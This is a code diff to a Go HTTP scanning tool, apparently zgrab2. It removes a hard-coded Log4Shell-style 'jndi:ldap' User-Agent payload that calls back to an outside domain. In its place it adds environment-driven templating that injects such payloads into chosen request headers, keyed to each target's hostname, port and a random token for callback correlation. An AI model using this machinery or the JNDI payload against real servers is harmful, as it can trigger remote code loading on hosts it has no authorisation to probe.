@@ -57,7 +57,7 @@ type Flags struct {
 	RetryHTTPS      bool   `long:"retry-https" description:"If the initial request fails, reconnect and try with HTTPS."`
 	MaxSize         int    `long:"max-size" default:"256" description:"Max kilobytes to read in response to an HTTP request"`
 	MaxRedirects    int    `long:"max-redirects" default:"0" description:"Max number of redirects to follow"`
-
+   TemplateHeaders bool   `long:"template-headers" description:"Perform dynamic templating of header values for correlation"`
 	// FollowLocalhostRedirects overrides the default behavior to return
 	// ErrRedirLocalhost whenever a redirect points to localhost.
 	FollowLocalhostRedirects bool `long:"follow-localhost-redirects" description:"Follow HTTP redirects to localhost"`
@@ -116,6 +116,8 @@ type scan struct {
 	client         *http.Client
 	results        Results
 	url            string
+   netloc         string
+   port           uint16
 	globalDeadline time.Time
 }
 
@@ -492,24 +494,28 @@ func (scanner *Scanner) newHTTPScan(t *zgrab2.ScanTarget, useHTTPS bool) *scan {
 		port = uint16(scanner.config.BaseFlags.Port)
 	}
 
-	randVal := RandomString(10)
-
-
-    hashInString := fmt.Sprintf("%s : %s:%d %s\n", randVal, host, port, scanner.config.Endpoint)
-	appendToFile("runlog.req", hashInString)
-
-	ret.client.UserAgent = fmt.Sprintf("$%%7Bjndi:ldap://%s.nyxxy.com%%7D", randVal)
-
-
-	// fmt.Printf("%s (%s)\n", host, randVal)
-
+   ret.netloc = host
+   ret.port = uint16(port)
 	ret.url = getHTTPURL(useHTTPS, host, port, scanner.config.Endpoint)
 
 	return &ret
 }
 
+func RandomInt(n int) string {
+    var letters = []rune("0123456789")
+ 
+	rSource := rand.NewSource(time.Now().UnixNano())
+    rGen := rand.New(rSource)
+
+    s := make([]rune, n)
+    for i := range s {
+        s[i] = letters[rGen.Intn(len(letters))]
+    }
+    return string(s)
+}
+
 func RandomString(n int) string {
-    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
+    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
  
 	rSource := rand.NewSource(time.Now().UnixNano())
     rGen := rand.New(rSource)
@@ -541,7 +547,52 @@ func (scan *scan) Grab() *zgrab2.ScanError {
 		// If user did not specify custom headers, legacy behavior has always been
 		// to set the Accept header
 		request.Header.Set("Accept", "*/*")
-	}
+   }
+
+
+   if scan.scanner.config.TemplateHeaders {
+      payloadTemplateStr, isPayloadSet := os.LookupEnv("TEMPLATE_PAYLOAD_FMT")
+      headerStr, isHdrSet := os.LookupEnv("TEMPLATE_HEADERS")
+
+      if ! isHdrSet || !isPayloadSet {
+         log.Fatal("$PAYLOAD_FMT and $TARGET_HEADERS must both be set, or both not set!")
+      }
+
+      if isHdrSet {
+         // TODO: Merge the templating with the --custom-headers-values / --custom-headers-names logic
+         //       Using the environment here is just a quick hack
+         // both PAYLOAD_FMT
+         // Fill in template variables to form a payload for headers
+         // Supported variables:
+         //   {{fqdn}}
+         //	  {{fqdn_hash}}
+         //	  {{port}}
+         //	  {{random}}
+         // TODO(AG): Support {{header_hash}}, replace inside each iteration to allow correlation
+         //           with the exact header if multiple headers are being replaced
+         var payloadStr string
+         // Replace {{fqdn}} and/or {{fqdn_hash}}
+         if strings.Contains(payloadTemplateStr, "{{fqdn_hash}}") {
+            // TODO(AG): If an FQDN is butting up against 250+ bytes, use a hash instead so the name is valid DNS
+            fqdnHash := md5.New()
+            fqdnHash.Write([]byte(scan.netloc))
+            fqdnHashString := hex.EncodeToString(fqdnHash.Sum(nil))
+            payloadTemplateStr = strings.Replace(payloadTemplateStr, "{{fqdn_hash}}", fqdnHashString, -1)
+         } else {
+            payloadTemplateStr = strings.Replace(payloadTemplateStr, "{{fqdn}}", scan.netloc, -1)
+         }
+         payloadTemplateStr = strings.Replace(payloadTemplateStr, "{{port}}", strconv.FormatUint(uint64(scan.port), 10), -1)
+
+         for _, header := range strings.Split(headerStr, ":") {
+            // Template the string for each header
+            // Randomness gets set in each iteration, so the headers can be correlated precisely
+            randVal := RandomString(8)
+            log.Errorf("Setting header=%s with template=%s\n", header, payloadTemplateStr)
+            payloadStr = strings.Replace(payloadTemplateStr, "{{random}}", randVal, -1)
+            request.Header.Set(header, payloadStr)
+         }
+      }
+   }
 
 	resp, err := scan.client.Do(request)
 	if resp != nil && resp.Body != nil {
